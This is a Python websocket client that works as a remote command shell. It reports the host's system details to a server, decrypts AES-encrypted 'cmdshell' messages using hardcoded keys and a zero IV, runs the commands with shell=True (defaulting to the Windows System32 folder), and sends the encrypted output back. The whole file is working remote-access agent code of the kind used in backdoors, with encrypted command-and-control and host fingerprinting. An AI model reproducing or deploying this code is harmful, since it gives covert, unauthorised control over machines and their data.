from tiny_aes import AES, pad, unpad
from platform_xmrt import xmplatform
import websocket
import json
import threading
import subprocess

system_info = xmplatform()
tyaes = AES()

URL = "ws://localhost:8000/api/server/shell"
HEADER = {
    "FRS": f"From {system_info.get('system')}{system_info.get('release')} {system_info.get('version')} On {system_info.get('machine')}",
    "FRSNode": system_info.get('node')
}
IV = b'\x00' * 16
AES_KEY = [
    b'O\xca\xfd\x1f[\xaa=\x1a\xa4\x80\xc4}$q[p',
    b'\x92Z7\x11\x81m\xac5r[k\x13)\xf1V\t',
    b'\x8dq\x92t\xa9\x00\xc9\x04;Z\xfe\x15\xba7R ',
    b'\xea[\xdc\xe7\xc3\xaa\x8a\xeeN\xdb\x18\x9a\xe7\xdb\xd1\x9e',
    b'\xdc\x81/\x8bf\xb6}\xab\xa0\xa4\xbe\xd4c\x0e4:',
    b'-\xd5,\xa0\xca\x0e\xfd>\x16\x8f\xd2\xb5p9\xaf\x1e',
    b'\xba\xdd\xcc\x85\xd9\xd3\xf8\xbf\xf4\x06\xd4\x1f>\x08)!',
    b'(\x87\xfb\x94X\xbeT\x8a\x04\xfd\xb2\xef\xdd.JP',
    b')(\x9eO\x17 \xb7n?\xa7L\xfag\x19\x18p',
    b'\xf0P\xe3j-~\xa9:\x04V7u\x13v\x80\x1b',
    b',\xd1\xcc\xe1K\xc8\xd4\x91X\x18b\xd9uf\xcb\xe3',
    b'q0\xfc\x96bF|\x8dN\x97\xb0l\x05_d\xfd',
    b'\x17[6\xb2b=\xfdQ\x13\r\x01\xc7qK}J'
]

def get_message(message_hex):
    ciphertext_bytes = bytes.fromhex(message_hex)
    decrypted = tyaes.aes_decrypt_cbc(ciphertext_bytes, AES_KEY, IV)
    unpadded = unpad(decrypted)
    return unpadded.decode('utf-8')

def send_message(ws, type: str, data: str, debug: str):
    message_json = {
        "type": type,
        "data": data,
        "debug": debug
    }
    plaintext_bytes = json.dumps(message_json).encode('utf-8')
    padded = pad(plaintext_bytes)
    ciphertext = tyaes.aes_encrypt_cbc(padded, AES_KEY, IV)
    ws.send(ciphertext.hex())

def handle_message(ws, message):
    try:
        decrypted_message = get_message(message)
        message_data = json.loads(decrypted_message)
        if message_data.get("type") == "cmdshell":
            run_command(ws, message_data)
        else:
            print("Received:", decrypted_message)
    except Exception as e:
        print("Failed to decrypt message:", str(e))

def run_command(ws, message_data):
    command = message_data.get("data")
    path = message_data.get("path", "C:\\Windows\\System32")
    timestamp = message_data.get("timestamp")
    if not command or not path:
        error_message = "Invalid command or path"
        print(error_message)
        send_message(ws, type="return", data=error_message, debug="")  # 发送错误信息
        send_message(ws, type="return", data="$$$end$$$", debug="")  # 添加结束标记
        return
    send_message(ws, type="return", data="$$$start$$$", debug="")
    
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            cwd=path,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        while True:
            output = process.stdout.readline()  # type: ignore
            if output == '' and process.poll() is not None:
                break
            if output:
                send_message(ws, type="return", data=output, debug="")
        
        stderr = process.stderr.read()  # type: ignore
        if stderr:
            send_message(ws, type="return", data=stderr, debug="")
        
        # 发送结束标记
        send_message(ws, type="return", data="$$$end$$$", debug="")

    except Exception as e:
        error_message = f"Error: {str(e)}"
        print(error_message)
        send_message(ws, type="return", data=error_message, debug="")  # 发送错误信息
        send_message(ws, type="return", data="$$$end$$$", debug="")  # 添加结束标记

def on_message(ws, message):
    handle_message(ws, message)

def on_error(ws, error):
    print("Error:", str(error))

def on_close(ws, close_status_code, close_msg):
    print("Connection closed")

def input_handler(ws):
    while True:
        msg = input()
        send_message(ws, type="chat", data=msg, debug="")

def on_open(ws):
    print("Connection opened")
    send_message(ws, type="init", data="Client initialized", debug="")
    threading.Thread(target=input_handler, args=(ws,), daemon=True).start()

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(
        URL,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
        header=[f"{k}: {v}" for k, v in HEADER.items()]
    )
    ws.on_open = on_open
    ws.run_forever(ping_interval=None) # type: ignore